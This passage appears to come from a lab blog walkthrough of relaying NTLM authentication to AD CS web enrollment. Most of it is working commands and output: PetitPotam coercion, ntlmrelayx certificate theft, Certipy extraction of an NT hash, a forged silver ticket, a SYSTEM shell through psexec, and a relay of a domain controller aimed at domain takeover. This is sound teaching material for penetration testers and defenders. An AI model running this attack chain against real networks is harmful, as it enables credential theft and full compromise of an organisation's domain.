            <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span>   \<span class="n">___</span><span class="o">|</span>   <span class="n">_</span>\<span class="n">__</span><span class="o">|</span>   <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span>   <span class="n">_</span>\<span class="n">__</span><span class="o">|</span>   <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span>   \<span class="n">___</span><span class="o">/</span>   <span class="n">_</span>\<span class="n">__</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span>  <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> 
          <span class="n">_</span><span class="o">|</span> <span class="s2">""" |_|"""""</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_|"""""</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_| """</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_|"""""</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_|"""""</span><span class="o">|</span> 
          <span class="s2">"`-0-0-'"</span><span class="err">`</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-'"</span><span class="err">`</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-'"</span><span class="err">`</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-' </span>

              <span class="n">PoC</span> <span class="n">to</span> <span class="n">elicit</span> <span class="n">machine</span> <span class="n">account</span> <span class="n">authentication</span> <span class="n">via</span> <span class="n">some</span> <span class="n">MS</span><span class="o">-</span><span class="n">EFSRPC</span> <span class="n">functions</span>
                                      <span class="n">by</span> <span class="n">topotam</span> <span class="p">(</span><span class="nd">@topotam77</span><span class="p">)</span>

                     <span class="n">Inspired</span> <span class="n">by</span> <span class="nd">@tifkin_</span> <span class="o">&amp;</span> <span class="nd">@elad_shamir</span> <span class="n">previous</span> <span class="n">work</span> <span class="n">on</span> <span class="n">MS</span><span class="o">-</span><span class="n">RPRN</span>



<span class="n">Trying</span> <span class="n">pipe</span> <span class="n">lsarpc</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ncacn_np</span><span class="p">:</span><span class="mf">192.168.100.4</span><span class="p">[</span>\<span class="n">PIPE</span>\<span class="n">lsarpc</span><span class="p">]</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connected</span><span class="err">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Binding</span> <span class="n">to</span> <span class="n">c681d488</span><span class="o">-</span><span class="n">d850</span><span class="o">-</span><span class="mi">11</span><span class="n">d0</span><span class="o">-</span><span class="mi">8</span><span class="n">c52</span><span class="o">-</span><span class="mi">00</span><span class="n">c04fd90f7e</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">bound</span><span class="err">!</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">EfsRpcOpenFileRaw</span><span class="err">!</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Got</span> <span class="n">RPC_ACCESS_DENIED</span><span class="err">!!</span> <span class="n">EfsRpcOpenFileRaw</span> <span class="ow">is</span> <span class="n">probably</span> <span class="n">PATCHED</span><span class="err">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">OK</span><span class="err">!</span> <span class="n">Using</span> <span class="n">unpatched</span> <span class="n">function</span><span class="err">!</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">EfsRpcEncryptFileSrv</span><span class="err">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Got</span> <span class="n">expected</span> <span class="n">ERROR_BAD_NETPATH</span> <span class="n">exception</span><span class="err">!!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Attack</span> <span class="n">worked</span><span class="err">!</span>
</pre></div>
<p>It worked! If you check the <code>ntlmrelayx</code> listener output, you’ll see that the authentication was successfully received and relayed to the AD CS HTTP endpoint. As a result, we obtained a valid certificate for the <code>Workstation01$</code> computer account:</p><br/>
<div class="highlight"><pre><span></span><span class="root1">root@ubuntu$</span><span class="n"> ntlmrelayx</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">t</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span><span class="o">/</span><span class="n">certsrv</span><span class="o">/</span><span class="n">certfnsh</span><span class="o">.</span><span class="n">asp</span> <span class="o">--</span><span class="n">adcs</span> <span class="o">-</span><span class="n">smb2support</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">http</span><span class="o">-</span><span class="n">server</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Servers</span> <span class="n">started</span><span class="p">,</span> <span class="n">waiting</span> <span class="k">for</span> <span class="n">connections</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBD</span><span class="o">-</span><span class="n">Thread</span><span class="o">-</span><span class="mi">4</span> <span class="p">(</span><span class="n">process_request_thread</span><span class="p">):</span> <span class="n">Received</span> <span class="n">connection</span> <span class="kn">from</span><span class="w"> </span><span class="mf">192.168.100.4</span><span class="p">,</span> <span class="n">attacking</span> <span class="n">target</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">HTTP</span> <span class="n">server</span> <span class="n">returned</span> <span class="n">error</span> <span class="n">code</span> <span class="mi">200</span><span class="p">,</span> <span class="n">treating</span> <span class="k">as</span> <span class="n">a</span> <span class="n">successful</span> <span class="n">login</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticating</span> <span class="n">against</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span> <span class="k">as</span> <span class="n">ELSWIXCORP</span><span class="o">/</span><span class="n">WORKSTATION01</span><span class="err">$</span> <span class="n">SUCCEED</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBD</span><span class="o">-</span><span class="n">Thread</span><span class="o">-</span><span class="mi">6</span> <span class="p">(</span><span class="n">process_request_thread</span><span class="p">):</span> <span class="n">Received</span> <span class="n">connection</span> <span class="kn">from</span><span class="w"> </span><span class="mf">192.168.100.4</span><span class="p">,</span> <span class="n">attacking</span> <span class="n">target</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">HTTP</span> <span class="n">server</span> <span class="n">returned</span> <span class="n">error</span> <span class="n">code</span> <span class="mi">200</span><span class="p">,</span> <span class="n">treating</span> <span class="k">as</span> <span class="n">a</span> <span class="n">successful</span> <span class="n">login</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticating</span> <span class="n">against</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span> <span class="k">as</span> <span class="n">ELSWIXCORP</span><span class="o">/</span><span class="n">WORKSTATION01</span><span class="err">$</span> <span class="n">SUCCEED</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Generating</span> <span class="n">CSR</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">CSR</span> <span class="n">generated</span><span class="err">!</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Getting</span> <span class="n">certificate</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Skipping</span> <span class="n">user</span> <span class="n">WORKSTATION01</span><span class="err">$</span> <span class="n">since</span> <span class="n">attack</span> <span class="n">was</span> <span class="n">already</span> <span class="n">performed</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">GOT</span> <span class="n">CERTIFICATE</span><span class="err">!</span> <span class="n">ID</span> <span class="mi">24</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Writing</span> <span class="n">PKCS</span><span class="c1">#12 certificate to ./WORKSTATION01$.pfx</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Certificate</span> <span class="n">successfully</span> <span class="n">written</span> <span class="n">to</span> <span class="n">file</span>
</pre></div>
<p>Now, we can use <code>Certipy</code> to authenticate to the KDC using the obtained certificate:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">certipy</span> <span class="n">auth</span> <span class="o">-</span><span class="n">pfx</span> <span class="n">WORKSTATION01</span>\<span class="err">$</span><span class="o">.</span><span class="n">pfx</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">192.168.100.2</span>
<span class="n">Certipy</span> <span class="n">v4</span><span class="mf">.8.2</span> <span class="o">-</span> <span class="n">by</span> <span class="n">Oliver</span> <span class="n">Lyak</span> <span class="p">(</span><span class="n">ly4k</span><span class="p">)</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Using</span> <span class="n">principal</span><span class="p">:</span> <span class="n">workstation01</span><span class="err">$</span><span class="nd">@elswixcorp</span><span class="o">.</span><span class="n">local</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">get</span> <span class="n">TGT</span><span class="o">...</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="n">TGT</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saved</span> <span class="n">credential</span> <span class="n">cache</span> <span class="n">to</span> <span class="s1">'workstation01.ccache'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">retrieve</span> <span class="n">NT</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'workstation01$'</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Got</span> <span class="nb">hash</span> <span class="k">for</span> <span class="s1">'workstation01$@elswixcorp.local'</span><span class="p">:</span> <span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">825</span><span class="n">d0602bda156a4d6fe85158b3140ee</span>
</pre></div>
<p>We’ve successfully authenticated as <code>Workstation01$</code> using the certificate, and we also retrieved its NT hash.</p><br/>
<p>To gain access to the <code>WORKSTATION01</code> system, we can now perform a <strong>Silver Ticket</strong> attack for the <code>HOST</code> service:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">ticketer</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">spn</span> <span class="s1">'HOST/WORKSTATION01'</span> <span class="o">-</span><span class="n">nthash</span> <span class="mi">825</span><span class="n">d0602bda156a4d6fe85158b3140ee</span> <span class="o">-</span><span class="n">domain</span><span class="o">-</span><span class="n">sid</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4266111273</span><span class="o">-</span><span class="mi">315482142</span><span class="o">-</span><span class="mi">3017431568</span> <span class="o">-</span><span class="n">domain</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="n">administrator</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">basic</span> <span class="n">skeleton</span> <span class="n">ticket</span> <span class="ow">and</span> <span class="n">PAC</span> <span class="n">Infos</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Customizing</span> <span class="n">ticket</span> <span class="k">for</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span><span class="o">/</span><span class="n">administrator</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_LOGON_INFO</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_CLIENT_INFO_TYPE</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTicketPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTGSRepPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Signing</span><span class="o">/</span><span class="n">Encrypting</span> <span class="n">final</span> <span class="n">ticket</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_SERVER_CHECKSUM</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">PAC_PRIVSVR_CHECKSUM</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTicketPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span>    <span class="n">EncTGSRepPart</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Saving</span> <span class="n">ticket</span> <span class="ow">in</span> <span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
<span class="nd">elswix@ubuntu$</span> <span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="o">=</span><span class="n">administrator</span><span class="o">.</span><span class="n">ccache</span>
<span class="nd">elswix@ubuntu$</span> <span class="n">psexec</span><span class="o">.</span><span class="n">py</span> <span class="n">workstation01</span> <span class="o">-</span><span class="n">k</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.11.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Requesting</span> <span class="n">shares</span> <span class="n">on</span> <span class="n">workstation01</span><span class="o">.....</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Found</span> <span class="n">writable</span> <span class="n">share</span> <span class="n">ADMIN</span><span class="err">$</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Uploading</span> <span class="n">file</span> <span class="n">oklvwwzG</span><span class="o">.</span><span class="n">exe</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">SVCManager</span> <span class="n">on</span> <span class="n">workstation01</span><span class="o">.....</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Creating</span> <span class="n">service</span> <span class="n">ZZDc</span> <span class="n">on</span> <span class="n">workstation01</span><span class="o">.....</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Starting</span> <span class="n">service</span> <span class="n">ZZDc</span><span class="o">.....</span>
<span class="p">[</span><span class="err">!</span><span class="p">]</span> <span class="n">Press</span> <span class="n">help</span> <span class="k">for</span> <span class="n">extra</span> <span class="n">shell</span> <span class="n">commands</span>
<span class="n">Microsoft</span> <span class="n">Windows</span> <span class="p">[</span><span class="n">Version</span> <span class="mf">10.0.19045.2006</span><span class="p">]</span>
<span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="n">Microsoft</span> <span class="n">Corporation</span><span class="o">.</span> <span class="n">All</span> <span class="n">rights</span> <span class="n">reserved</span><span class="o">.</span>

<span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span> <span class="n">whoami</span>

<span class="n">nt</span> <span class="n">authority</span>\<span class="n">system</span>

<span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">system32</span><span class="o">&gt;</span>
</pre></div>
<h3>Relaying authentication of a Domain Controller</h3><br/>
<p>Successfully exploiting this misconfiguration can lead to full domain compromise. The same technique demonstrated earlier can be used, but instead of relaying authentication from a regular domain-joined computer, we can relay authentication from a <strong>Domain Controller</strong>. This is significantly more dangerous, as compromising a DC account allows us to perform attacks like <code>DCSync</code>, effectively taking over the entire domain.</p><br/>
<p>Let’s demonstrate this scenario. This time, instead of relaying authentication from <code>Workstation01</code>, we’ll relay authentication from <code>DC01</code>.</p><br/>
<p>First, let’s set up the <code>ntlmrelayx</code> listener again. The configuration is almost the same, but in this case, you must explicitly specify the <code>DomainController</code> template. Otherwise, <code>ntlmrelayx</code> will default to requesting a certificate using the <code>Machine</code> template, which will not work. This is also noted in the help output:</p><br/>
<div class="highlight"><pre><span></span>--template TEMPLATE   AD CS template. Defaults to Machine or User whether relayed account name ends with `$`. Relaying a DC should require specifying `DomainController`
</pre></div>
<p>Execute <code>ntlmrelayx</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="root1">root@ubuntu$</span> <span class="n">ntlmrelayx</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">t</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span><span class="o">/</span><span class="n">certsrv</span><span class="o">/</span><span class="n">certfnsh</span><span class="o">.</span><span class="n">asp</span> <span class="o">--</span><span class="n">adcs</span> <span class="o">-</span><span class="n">smb2support</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">http</span><span class="o">-</span><span class="n">server</span> <span class="o">--</span><span class="n">template</span> <span class="s2">"DomainController"</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">DCSYNC</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">HTTPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">HTTP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">SMB</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">IMAP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">IMAPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">LDAPS</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">LDAP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">RPC</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">MSSQL</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Protocol</span> <span class="n">Client</span> <span class="n">SMTP</span> <span class="n">loaded</span><span class="o">..</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Running</span> <span class="ow">in</span> <span class="n">relay</span> <span class="n">mode</span> <span class="n">to</span> <span class="n">single</span> <span class="n">host</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">SMB</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">445</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">WCF</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">9389</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Setting</span> <span class="n">up</span> <span class="n">RAW</span> <span class="n">Server</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">6666</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Multirelay</span> <span class="n">disabled</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Servers</span> <span class="n">started</span><span class="p">,</span> <span class="n">waiting</span> <span class="k">for</span> <span class="n">connections</span>
</pre></div>
<p>Now, let’s use <code>PetitPotam</code> again, but this time targeting the IP address of <code>DC01</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">python</span> <span class="n">PetitPotam</span><span class="o">.</span><span class="n">py</span> <span class="mf">192.168.100.1</span> <span class="mf">192.168.100.3</span> <span class="o">-</span><span class="n">d</span> <span class="n">elswixcorp</span><span class="o">.</span><span class="n">local</span> <span class="o">-</span><span class="n">u</span> <span class="n">elswix</span> <span class="o">-</span><span class="n">p</span> <span class="n">Password2</span><span class="err">!</span>


              <span class="n">___</span>            <span class="n">_</span>        <span class="n">_</span>      <span class="n">_</span>        <span class="n">___</span>            <span class="n">_</span>                     
             <span class="o">|</span> <span class="n">_</span> \   <span class="n">___</span>    <span class="o">|</span> <span class="o">|</span><span class="n">_</span>     <span class="p">(</span><span class="n">_</span><span class="p">)</span>    <span class="o">|</span> <span class="o">|</span><span class="n">_</span>     <span class="o">|</span> <span class="n">_</span> \   <span class="n">___</span>    <span class="o">|</span> <span class="o">|</span><span class="n">_</span>    <span class="n">__</span> <span class="n">_</span>    <span class="n">_</span> <span class="n">__</span>   
             <span class="o">|</span>  <span class="n">_</span><span class="o">/</span>  <span class="o">/</span> <span class="o">-</span><span class="n">_</span><span class="p">)</span>   <span class="o">|</span>  <span class="n">_</span><span class="o">|</span>    <span class="o">|</span> <span class="o">|</span>    <span class="o">|</span>  <span class="n">_</span><span class="o">|</span>    <span class="o">|</span>  <span class="n">_</span><span class="o">/</span>  <span class="o">/</span> <span class="n">_</span> \   <span class="o">|</span>  <span class="n">_</span><span class="o">|</span>  <span class="o">/</span> <span class="n">_</span><span class="err">`</span> <span class="o">|</span>  <span class="o">|</span> <span class="s1">'  \  </span>
            <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span>   \<span class="n">___</span><span class="o">|</span>   <span class="n">_</span>\<span class="n">__</span><span class="o">|</span>   <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span>   <span class="n">_</span>\<span class="n">__</span><span class="o">|</span>   <span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span>   \<span class="n">___</span><span class="o">/</span>   <span class="n">_</span>\<span class="n">__</span><span class="o">|</span>  \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span>  <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> 
          <span class="n">_</span><span class="o">|</span> <span class="s2">""" |_|"""""</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_|"""""</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_| """</span> <span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_|"""""</span><span class="o">|</span><span class="n">_</span><span class="o">|</span><span class="s2">"""""|_|"""""</span><span class="o">|</span> 
          <span class="s2">"`-0-0-'"</span><span class="err">`</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-'"</span><span class="err">`</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-'"</span><span class="err">`</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="s1">'"`-0-0-'</span><span class="s2">"`-0-0-' </span>

              <span class="n">PoC</span> <span class="n">to</span> <span class="n">elicit</span> <span class="n">machine</span> <span class="n">account</span> <span class="n">authentication</span> <span class="n">via</span> <span class="n">some</span> <span class="n">MS</span><span class="o">-</span><span class="n">EFSRPC</span> <span class="n">functions</span>
                                      <span class="n">by</span> <span class="n">topotam</span> <span class="p">(</span><span class="nd">@topotam77</span><span class="p">)</span>

                     <span class="n">Inspired</span> <span class="n">by</span> <span class="nd">@tifkin_</span> <span class="o">&amp;</span> <span class="nd">@elad_shamir</span> <span class="n">previous</span> <span class="n">work</span> <span class="n">on</span> <span class="n">MS</span><span class="o">-</span><span class="n">RPRN</span>



<span class="n">Trying</span> <span class="n">pipe</span> <span class="n">lsarpc</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">ncacn_np</span><span class="p">:</span><span class="mf">192.168.100.3</span><span class="p">[</span>\<span class="n">PIPE</span>\<span class="n">lsarpc</span><span class="p">]</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Connected</span><span class="err">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Binding</span> <span class="n">to</span> <span class="n">c681d488</span><span class="o">-</span><span class="n">d850</span><span class="o">-</span><span class="mi">11</span><span class="n">d0</span><span class="o">-</span><span class="mi">8</span><span class="n">c52</span><span class="o">-</span><span class="mi">00</span><span class="n">c04fd90f7e</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Successfully</span> <span class="n">bound</span><span class="err">!</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">EfsRpcOpenFileRaw</span><span class="err">!</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Got</span> <span class="n">RPC_ACCESS_DENIED</span><span class="err">!!</span> <span class="n">EfsRpcOpenFileRaw</span> <span class="ow">is</span> <span class="n">probably</span> <span class="n">PATCHED</span><span class="err">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">OK</span><span class="err">!</span> <span class="n">Using</span> <span class="n">unpatched</span> <span class="n">function</span><span class="err">!</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">EfsRpcEncryptFileSrv</span><span class="err">!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Got</span> <span class="n">expected</span> <span class="n">ERROR_BAD_NETPATH</span> <span class="n">exception</span><span class="err">!!</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Attack</span> <span class="n">worked</span><span class="err">!</span>
</pre></div>
<p>Success — we’ve obtained a certificate for the <code>DC01$</code> computer account:</p><br/>
<div class="highlight"><pre><span></span><span class="root1">root@ubuntu$</span> <span class="n">ntlmrelayx</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">t</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span><span class="o">/</span><span class="n">certsrv</span><span class="o">/</span><span class="n">certfnsh</span><span class="o">.</span><span class="n">asp</span> <span class="o">--</span><span class="n">adcs</span> <span class="o">-</span><span class="n">smb2support</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">http</span><span class="o">-</span><span class="n">server</span> <span class="o">--</span><span class="n">template</span> <span class="s2">"DomainController"</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="n">Fortra</span><span class="p">,</span> <span class="n">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 

<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Servers</span> <span class="n">started</span><span class="p">,</span> <span class="n">waiting</span> <span class="k">for</span> <span class="n">connections</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBD</span><span class="o">-</span><span class="n">Thread</span><span class="o">-</span><span class="mi">4</span> <span class="p">(</span><span class="n">process_request_thread</span><span class="p">):</span> <span class="n">Received</span> <span class="n">connection</span> <span class="kn">from</span><span class="w"> </span><span class="mf">192.168.100.3</span><span class="p">,</span> <span class="n">attacking</span> <span class="n">target</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.100.2</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">HTTP</span> <span class="n">server</span> <span class="n">returned</span> <span class="n">error</span> <span class="n">code</span> <span class="mi">200</span><span class="p">,</span> <span class="n">treating</span> <span class="k">as</span> <span class="n">a</span> <span class="n">successful</span> <span class="n">login</span>
